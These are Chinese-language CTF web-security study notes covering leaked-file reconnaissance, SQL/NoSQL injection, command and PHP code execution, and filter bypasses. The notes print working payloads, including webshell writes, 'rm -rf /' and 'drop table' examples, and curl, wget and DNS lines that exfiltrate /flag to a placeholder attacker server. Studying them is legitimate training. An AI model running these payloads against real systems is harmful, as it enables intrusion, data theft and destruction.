第二章：信息收集 (Information Gathering)

Web 题的第一步永远是把题目“看光”。

敏感文件泄露

  • robots.txt、sitemap.xml。

1. 管理类文件

1.1 robots.txt

  • 作用：搜索引擎爬虫协议文件，告诉爬虫哪些路径不应抓取。

  • 渗透思路：黑名单信息含涉密路径、后门、管理后台、备份等，非常容易疏忽泄露。

  • 例子：

    Disallow: /admin
Disallow: /hidden/flag.txt
1.2 sitemap.xml
  • 作用：网站内容地图，列出所有可爬网址。
  • 渗透思路：直接暴露未公开子目录，配合robots.txt查询价值极高。
1.3 .env
  • 作用：各类Web框架常用环境变量文件。
  • 渗透：很多JWT密钥、数据库连接信息、邮箱API等一览无遗，PHP、Laravel、Node.js尤其常见。

2. 源码和仓库泄露

2.1 .git/
  • 作用：Git版本库目录。
  • 渗透：若未做严格防护可直接遍历和还原完整源码。使用 GitHack.py、githound等工具，一键还原全部源码+敏感信息。
2.2 .svn/、.hg/
  • 作用：分别对应Subversion、Mercurial代码管理目录。
  • 渗透：同理可还原源代码及全部提交历史。
2.3 .DS_Store
  • 作用：Mac下目录索引文件。
  • 渗透：泄露完整目录结构（可见文件名），辅助发现“隐藏文件”“Flag”。
2.4 www.zip、code.tar.gz、source.bak
  • 作用：习惯性手工备份或源码打包，上传或备份遗留。
  • 渗透：敏感备份/打包文件常规文件： www.zip、web.zip、backup.zip、site.bak、index.php.bak、src.rar、bak.tar.gz等

3. 编辑器临时/自动备份文件

3.1 Vim/Emacs交换备份
  • .swp/.swo
  • 例：index.php.swp
  • 用途与危害：Vim自动生成的内存交换文件。利用strings等命令可恢复大量源码或明文密码。
3.2 Emacs临时文件
  • 例：index.php~, #index.php#
3.3 其它常见临时/备份扩展
  • .bak、.old、.backup、.save、.tmp、.temp
  • 典型案例：index.php.bak、config.php.old，甚至flag.php.save

4. 常见渗透/CTF技巧总结

  1. 爆破路径字典：用字典工具快速遍历敏感路径 典例：dirsearch, ffuf, gobuster
  2. 尝试访问源码与备份文件：如index.php.bak，几乎等同于源码泄露。
  3. 下载解压源码包或查看仓库提交历史：发现历史密码、后台路径、flag等。
  4. 扫描.git, .svn, .hg：直接还原项目全部文件、操作commit，甚至逆推出未上线flag。
  5. 编辑器遗留文件源码复原：如vim .swp 文件，用strings或专用工具还原内容，常获flag。
  • 源码泄露：www.zip、.git、.svn、.hg、.DS_Store。
  • 备份文件：index.php.bak、vim 交换文件 (.swp)。
  1. 指纹识别
    • 判断操作系统（Linux/Windows）、中间件（Apache/Nginx/IIS/Tomcat）、数据库类型。
    • CMS 识别（WordPress, Discuz, Typecho 等）。
  2. 其他
    • PHPinfo 页面分析（查看 disable_functions、开启的扩展）。
    • 社工与 OSINT（如果有涉及）。

第三章：核心漏洞 - 注入篇 (Injection Attacks)

CTF Web 的半壁江山。

SQL 注入 (SQLi)：

  • 基础：Union 注入, Boolean 盲注, Time 盲注。

  • 进阶：报错注入, 堆叠注入 (Stacked Queries)。

  • 技巧：WAF 绕过 (空格变体、编码绕过), NoSQL 注入 (MongoDB)。

在CTF中遇到SQL注入，先问自己三个问题：

  1. 注入点在哪？（确定注入点：GET/POST/Cookie/User-Agent）
  2. 数据库在干嘛？（判断类型：数字型/字符型/JSON型） 3. 结果怎么看？（决定手法：有回显用Union，无回显用盲注）

1. 基础部分

Union 注入

适用场景：页面有明确的数据回显位置（如表格、用户名列表）。注意字段数对齐 核心步骤：

  1. order by n 猜列数（直到报错或页面异常）。
  2. union select 1,2,3... 查看回显位（哪个数字出现在页面关键位置）。
  3. 在回显位替换为 database() / group_concat(table_name)。
  • CTF小技巧：如果 union 被拦截，尝试 union all 或 union distinct；如果回显位显示不正常，检查是否是显错位在图片或二进制流中（需要hex编码）。
Boolean 盲注

适用场景：页面不显示数据，但会根据SQL真假返回“成功/失败”或“存在/不存在”的不同页面。 核心逻辑：and ascii(substr(database(),1,1)) > 100 —— 页面正常则继续，异常则调整ASCII码。**

  • CTF小技巧：写脚本时注意二分法（50, 75, 88…）可以大幅减少请求次数；如果页面差异不明显，注意比较响应包长度(Content-Length)或状态码，不要肉眼看。
Time 盲注

适用场景：页面完全无回显，也没有布尔状态变化（比如插入日志、报错被全局吞掉）。页面永远不变，只有响应时间变。 核心逻辑：and if(ascii(substr(database(),1,1))>100, sleep(5), 0)

  • CTF小技巧：延时不要设5秒，设1秒或2秒即可，配合benchmark(10000000,md5('a'))有时更稳定；写多线程脚本时注意超时时间设置比延时稍长。

2. 进阶部分

报错注入

适用场景：页面开启了数据库错误回显（Error-based），但union被限制或不支持。 常用Payload：

  • updatexml(1, concat(0x7e, user(), 0x7e), 1) —— MySQL 5.1+
  • extractvalue(1, concat(0x7e, version())) CTF避坑：报错注入有长度限制（最长32位），大量数据请配合substr分段截取，或改用group_concat先聚合再分段。
堆叠注入 (Stacked Queries)

适用场景：mysqli_multi_query() 或 PDO 允许多语句执行（CTF中常见于强网杯、HCTF）。 CTF核心玩法：它不用于查数据，而是用于改数据或写文件。

  • ; drop table flag -- - （破坏性，慎用）

  • ; set @sql=...; prepare ...; execute ...; （预编译绕过过滤）

  • ; select '<?php eval($_POST[1])?>' into outfile '/var/www/shell.php' （需知路径）

  • 关键提示：堆叠注入在CTF中90%用于getshell或UDF提权，而不是查表内容。

3. 技巧部分（重点写“WAF绕过的底层逻辑”）

WAF 绕过（空格变体、编码绕过）
  1. 空格绕过（当空格被过滤）：
    • /**/ （内联注释）
    • %0a （换行）、%0c （换页）
    • 括号() 包裹：select(id)from(users)
  2. 关键字绕过（当select/union被过滤）：
    • 大小写：SeLeCt
    • 内联注释：/*!50000union*/
    • 双写：ununionion （针对替换为空的情况）
  3. 编码绕过（当WAF做正则匹配时）：
    • URL双重编码：%2527
    • Unicode：%EF%BC%87 （全角引号，部分数据库支持）
    • Hex编码：0x61646d696e 替代 'admin'
NoSQL 注入 (MongoDB)

NoSQL的语法和SQL完全不一样。这里用大多数情况下的MongoDB举例

对比维度 SQL注入 (SQLi) NoSQL注入 (MongoDB)
目标数据库 关系型（MySQL/Oracle等） 非关系型（MongoDB等）
注入语法 拼接 SELECT、UNION、OR 1=1 注入 $ne、$gt、$where、数组语法
攻击载体 字符串拼接 JSON结构或操作符污染
利用难度 工具成熟（sqlmap） 需手工构造，无统一自动化工具
典型后果 数据泄露、写Shell、提权 数据泄露、绕过认证、执行JS（若启用）

什么是关系型和非关系型呢？

维度 关系型（MySQL） 非关系型（MongoDB）
存储逻辑 像Excel多个工作表，用公式（外键）串起来 像Word文档，把一件事从头到尾写在一个段落里
数据一致性 强一致。改地址只改一处，全局生效 可能有冗余。如果每个订单文档都单独存地址，改地址要改N处
查询方式 多表联查（JOIN）：用户表 JOIN 订单表 ON... 查一个文档就拿到所有信息，无需联查
适合场景 金融、ERP、账务（钱和数字绝对不能乱，必须强约束） 社交动态、商品详情页、日志（数据结构多变，允许偶尔不一致）

关系型（SQL）：信奉 “数据完整性至上”。设计数据库先画ER图（实体关系图），把复杂的数据拆成最小原子，用“关系”约束它们。优点是精准、节省空间，缺点是慢（因为查个数据可能要关联5张表）。

非关系型（NoSQL）：信奉 “开发效率至上”。互联网时代数据格式千变万化（比如今天加个标签，明天加个评论），每次都去改表结构太痛苦。不如直接把整个对象存成JSON，用空间换时间，查询极快（因为一次就读出来了），缺点是有数据冗余。

CTF中的NoSQL注入 常出现在Node.js或PHP的MongoDB环境中。 核心差异：不再是' or 1=1 --，而是破坏JSON结构。 经典Payload：

  • 参数传：username[$ne]=null&password[$ne]=null （$ne 不等于，绕过登录）
  • 传JSON体：{"username": {"$regex": "^admin"}} （正则盲注） CTF技巧：注意$where函数，如果题目允许JavaScript执行，可以用$where: "function(){return this.username=='admin' && sleep(10000)}"进行时间盲注。

伪代码流程图：

if (页面有数据回显) {
    if (能正常使用 union) -> Union注入;
    else -> 报错注入;
} else if (页面有真/假状态) {
    -> Boolean盲注;
} else {
    -> Time盲注;
}
if (分号; 能执行多条SQL) {
    -> 优先考虑堆叠写入文件;
}
if (遇到WAF拦截) {
    -> 先试注释符/大小写，再试编码，最后试HTTP参数污染(HPP);
}
if (参数是JSON格式) {
    -> 切换到NoSQL注入思维;
}

命令执行 (RCE/Command Injection)：

1.原理

开发者把用户输入直接当作系统命令的一部分去执行时，就会导致命令执行。

典型错误代码（PHP）：

$ip = $_GET['ip'];
system("ping -c 4 " . $ip);  // 开发者想实现ping功能

如果用户传入 8.8.8.8; rm -rf /，最终执行的命令就是：

ping -c 4 8.8.8.8; rm -rf /

分号 ; 让系统执行完ping后，顺手执行了删库命令。

操作命令符详解

符号 名称 执行逻辑 典型Payload 利用场景
; 顺序执行 不管前面成功失败，后面照跑 ping 127.0.0.1; whoami 最通用，无脑首选
& 后台执行 前面命令放后台运行，立即执行后面 ping 127.0.0.1 & whoami 不在乎前面输出，只管注入
&& 逻辑与 前面成功(返回0)才执行后面 ping 127.0.0.1 && whoami 避免报错暴露，更隐蔽
` ` 管道符 前面输出作为后面的输入 `cat /flag
` ` 逻辑或 前面失败(返回非0)才执行后面

2.常见触发函数

PHP

  • system()、exec()、shell_exec()（无反引号）
  • passthru()、popen()、proc_open()
  • 反引号：ls 等价于 shell_exec()
  • eval()（严格来说是代码执行，但经常和命令执行混用）

Python

  • os.system()、os.popen()、subprocess.Popen()、subprocess.call()

Java

  • Runtime.getRuntime().exec()、ProcessBuilder

Node.js

  • child_process.exec()、child_process.spawn()

看到参数直接拼在函数名后面，可试探：

?cmd=id
?ip=127.0.0.1;whoami
?file=test.txt|ls

当页面回显指令执行结果时，利用：

# 查看当前用户
?cmd=whoami
# 查看当前目录
?cmd=ls
# 直接读flag
?cmd=cat /flag
?cmd=cat flag.php
?cmd=tac flag.php      # tac是cat的反向输出
?cmd=more flag.php
?cmd=less flag.php
?cmd=head flag.php
?cmd=tail flag.php
...
#cat被过滤时找其他方法读取flag

3.无回显 RCE

命令执行了，但页面一片空白或只返回固定内容（如 ping 输出被丢弃）。

DNS外带

利用 dig 或 nslookup 将数据带出：

# Linux
?cmd=nslookup $(whoami).your-dnslog.cn
?cmd=dig $(cat /flag | base64).your-dnslog.cn

# Windows（CTF较少见）
?cmd=ping %USERNAME%.your-dnslog.cn
HTTP外带
?cmd=curl http://your-server.com/$(whoami)
?cmd=wget http://your-server.com/$(cat /flag | base64)

4.字符限制绕过

当 空格 被WAF拦截时：

替代方案 示例 说明
$IFS cat$IFS/flag Linux内部字段分隔符
$IFS$1 cat$IFS$1/flag $1 变为空，常用绕过
${IFS} cat${IFS}/flag 花括号版本
%09 cat%09/flag URL编码的Tab符
%0a cat%0a/flag URL编码的换行符
<> cat<>/flag 重定向符号
{,} {cat,/flag} 花括号展开
$() cat$(echo /flag) 命令替换

常用命令被拦截时

场景 绕过方式 示例
cat被过滤 使用替代命令 tac more less head tail nl sort od xxd base64 strings
flag被过滤 通配符 cat /fl* cat /f???
cat和flag都被过滤 拼接法 c''at /fl''ag c"a"t /fl"ag"
关键字整体过滤 环境变量拼接 a=c;b=at;$a$b /flag
反引号被过滤 $()替代 id → $(id)
分号被过滤 换行符 %0a ping 127.0.0.1%0awhoami
**管道符 ` ` 被过滤** 用 `

通配符详解：

cat /fl*        # 匹配所有以fl开头的文件
cat /f???       # ? 匹配一个字符，匹配 flag
cat /f[a-z]g    # 字符集匹配
cat /[!0-9]*    # 排除数字开头的文件

利用环境变量拼凑命令：

# 从系统变量中取字符拼出命令
echo ${PATH}     # /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
echo ${PATH:0:1} # /
echo ${PATH:5:1} # l

#同理就像这样拼出 cat /flag

输入长度被限制（如只能输入5个字符）。

利用 > 文件名 创建文件，再通过 ls -t 按时间排序，最后 sh 执行。

# 每次输入一个短命令，逐步构建
> dir
> "sl"        # 注意方向，实际利用时反向写入
> "tac"
> "fl"
> "g\\"
> "\\"
> "\\"
> "\\"
> "\\"
> "\\"
> sh

双写绕过

很多WAF或过滤函数会做字符串替换，比如把 flag 替换成空字符串。但如果只替换一次，攻击者可以利用双写来绕过。

$cmd = str_replace("flag", "", $_GET['cmd']);
system($cmd);

攻击者传入：

cat flflagag

代码执行 (Code Execution)：

代码执行和命令执行的区别：

维度 命令执行 代码执行
执行环境 操作系统Shell（bash/cmd） 编程语言解释器（PHP/Python/Java等）
典型函数 system()、exec()、shell_exec() eval()、assert()、preg_replace('/e')
执行内容 ls、whoami、cat /flag phpinfo();、system('ls')、__import__('os')
一句话区分 让服务器执行系统命令 让服务器执行代码
最终目的 直接读取文件/getshell 先执行代码，再通过代码调系统命令
  • eval(), assert() 的滥用。

常见触发函数

PHP（CTF出现频率最高）

函数 说明 示例Payload
eval() 把字符串当PHP代码执行 eval($_GET[1]) → ?1=phpinfo();
assert() 类似eval，但字符串参数才执行 assert($_GET[1]) → ?1=phpinfo()
preg_replace('/e') 正则替换时执行代码（PHP 5.5+已废弃） preg_replace('/.*/e', $_GET[1], '')
create_function() 创建匿名函数并执行 create_function('',$_GET[1])
array_map() 回调执行 array_map('assert', $_GET[1])
usort() / uasort() 自定义排序函数 usort($_GET, 'assert')
call_user_func() 调用回调函数 call_user_func('assert', $_GET[1])
system() / exec() 其实也算代码执行的"下游" 见命令执行章节

Python（Flask/SSTI场景）

函数/方法 说明 示例Payload
eval() 同PHP eval("__import__('os').popen('ls').read()")
exec() 执行代码块 exec("print(open('/flag').read())")
compile() 编译后执行 exec(compile('print(1)','','exec'))
__import__() 动态导入模块 __import__('os').system('ls')

JavaScript/Node.js

函数 说明 示例Payload
eval() 同PHP/Python eval("require('child_process').exec('ls')")
new Function() 创建函数并执行 new Function('return process')()
setTimeout() / setInterval() 字符串参数会被执行 setTimeout("console.log(1)", 1000)

Java（反序列化/表达式注入）

函数/框架 说明 示例Payload
Runtime.getRuntime().exec() 执行系统命令 见命令执行章节
ScriptEngineManager 执行JS/Python代码 engine.eval("java.lang.Runtime.getRuntime().exec('ls')")
OGNL/SpEL表达式 框架表达式注入 ${7*7} → 49
ProcessBuilder 执行系统命令 new ProcessBuilder("ls").start()

基础利用（有回显）

拿到代码执行点后，先确认能执行什么：

// 测试PHP代码执行
?cmd=phpinfo();          // 看是否执行，同时确认disable_functions
?cmd=echo 123;           // 简单回显测试
?cmd=print_r(scandir('/'));  // 列出根目录
?cmd=var_dump(file_get_contents('/flag'));  // 直接读flag

CTF最常用Payload（PHP）：

// 1. 直接读文件
?cmd=echo file_get_contents('/flag');
?cmd=readfile('/flag');
?cmd=highlight_file('/flag');   // 高亮显示源码
?cmd=include('/flag');          // 把flag当PHP代码包含进来（会输出）
?cmd=require('/flag');

// 2. 列目录（找flag在哪）
?cmd=print_r(scandir('/'));
?cmd=print_r(scandir('/var/www/html'));
?cmd=print_r(scandir('.'));

// 3. 执行系统命令（如果system没被禁用）
?cmd=system('cat /flag');
?cmd=exec('cat /flag', $o); var_dump($o);
?cmd=shell_exec('cat /flag');
?cmd=`cat /flag`;              // 反引号在PHP中也是shell_exec
?cmd=passthru('cat /flag');

// 4. 查看当前路径
?cmd=echo __DIR__;
?cmd=echo getcwd();

进阶利用

无回显

场景：代码执行了，但页面没有任何输出（比如 eval($_GET[1]) 把结果丢弃了）。

解法一：写入文件（Webshell）

?cmd=file_put_contents('/var/www/html/shell.php', '<?php eval($_POST[1]);?>');

解法二：HTTP外带

?cmd=file_get_contents('http://your-server.com/?' . base64_encode(file_get_contents('/flag')));

解法三：DNSLog外带（PHP）

?cmd=system('nslookup ' . exec('cat /flag | base64') . '.your-dnslog.cn');

解法四：时间盲注（如果PHP函数被禁用一堆，但还能执行 sleep）

?cmd=if (file_get_contents('/flag')[0] === 'f') { sleep(5); }
disable_functions 绕过（PHP高级考点）

CTF中PHP常禁用高危函数（system、exec、passthru、shell_exec 等），但这不代表不能执行系统命令。

绕过方法一览：

方法 原理 示例
命令执行函数黑名单绕过 用没禁用的函数 array_map('system', ['cat /flag'])
LD_PRELOAD劫持 利用环境变量加载恶意so putenv("LD_PRELOAD=/tmp/shell.so"); mail("","","","")
PHP-FPM未授权 通过FCGI协议执行任意PHP代码 利用Gopher协议打PHP-FPM
ImageMagick漏洞 利用Imagick组件 上传恶意图片触发
环境变量提权 利用 BASH_ENV / ENV putenv("BASH_ENV=/tmp/evil.sh"); system('bash')
GC回收机制 利用 php://filter + 反序列化 较复杂，此处不展开

CTF中最高频：LD_PRELOAD + mail() / error_log()（触发子进程加载恶意so）

// 简化版（完整EXP较长，推荐直接使用工具：bypass_disablefunc）
putenv("LD_PRELOAD=/tmp/bypass.so");
mail("", "", "", "");
system("cat /flag");  // 现在system就能用了
危险函数变种（过滤绕过）

场景：eval 被过滤了，但题目还用了其他危险函数。

// 原题：eval($_GET[1]);
// 如果 eval 被正则过滤了
?cmd=assert($_GET[1]);  // assert 能替代 eval（PHP 7 以下）

// 如果 assert 也被过滤了
?cmd=call_user_func('assert', $_GET[1]);

// 如果所有函数名都被过滤（用数组回调）
?cmd=array_map('assert', [$_GET[1]]);

// 如果函数名是字符串拼接构造
?cmd=$a='eval'; $a($_GET[1]);

// 如果执行点包含在字符串中（动态函数名）
?cmd=${'_GET'}['1']();   // 等价于 $_GET[1]()
?cmd=$_GET[1]($_GET[2]); // 传参 ?1=system&2=ls
绕过长度限制（代码执行版）

场景：输入长度被限制（如只能输入10个字符），但内容是PHP代码。

解法：<?= eval($_POST[1]);

// 输入最小webshell（PHP短标签）
?cmd=<?=eval($_POST[1]);
// 只有19个字符，如果限制更严...

// 更短（7个字符）：利用反引号
?cmd=`$_GET[1]`;   // 但需要传 ?1=ls

经典超短Payload（HITCON级别）：

<?=`$_GET[1]`;     // 12字符，执行任意系统命令
无字母数字的代码执行（极限CTF题）

场景：WAF过滤了所有字母和数字，只能传符号。

核心思路：利用PHP的取反~、异或^、自增++ 构造字符串。

经典Payload（无字母数字webshell）：

// 利用 ~ 取反构造 phpinfo()
$_=~%8F%97%8F%96%91%99%90;    // 取反后得到 phpinfo
$_();

// 更通用的Payload（异或构造任意函数）
$_=(_/_._)[_];   // 通过数组下标取字符，拼接成函数名

深度讲解（出现概率不高）：

// 1. 利用自增构造字母（从 'A' 开始）
$_=[];       // 数组
$__=$_[0];   // 未定义，但自增后变成字符串
++$__;       // 'a'
++$__;       // 'b'
// ... 可以构造任意小写字母

// 2. 利用异或构造字符串
$_=('!'^'@').('"'^'#');  // 逐字符异或，可拼出任意函数名

第五章：客户端与认证安全 (Client-side & Auth)

  1. XSS (跨站脚本攻击)：
    • 反射型、存储型、DOM 型。
    • CSP (内容安全策略) 绕过技巧。
    • XSS Bot 题目解法 (Admin 访问恶意链接)。
  2. CSRF & SSRF：
    • SSRF (服务端请求伪造)：攻击内网、Redis 未授权访问、Gopher 协议利用。
  3. 认证与逻辑漏洞：
    • 弱口令与爆破。

    • IDOR (越权访问)。
    • 密码找回逻辑漏洞。

第六章：语言特性与反序列化 (Language Specifics)

针对不同后端语言的特性（Trick），是 CTF Web 的精髓。

  1. PHP 奇技淫巧：

    • 弱类型比较 (== vs ===, MD5 碰撞)。
    • 变量覆盖 (extract, parse_str)。
    • PHP 反序列化：魔术方法 (__construct, __wakeup, __destruct), POP 链构造, Phar 反序列化。
    • 原生类利用 (SoapClient, SplFileObject)。

  2. Python Web :

    • SSTI (模板注入)：Jinja2, Tornado, Mako。利用 __class__, __mro__, __subclasses__ 寻找利用链。

    • Pickle 反序列化：手写 opcode，利用 __reduce__。

    • PyJail (沙箱逃逸)。

    • 格式化字符串漏洞。

  3. Java 安全：

    • Java 反序列化 (ysoserial 工具, CommonsCollections 利用链, Fastjson, Jackson, Log4j2）
    • 表达式注入：SPEL, OGNL。
    • Spring Boot Actuator配置不当。
    • WebLogic, Shiro, Struts2 历史漏洞复现。
    • 内存马 (Memory Shell) 概念。

  4. Node.js：

    • 原型链污染 (Prototype Pollution)。
    • JS 弱类型与 VM 沙箱逃逸。
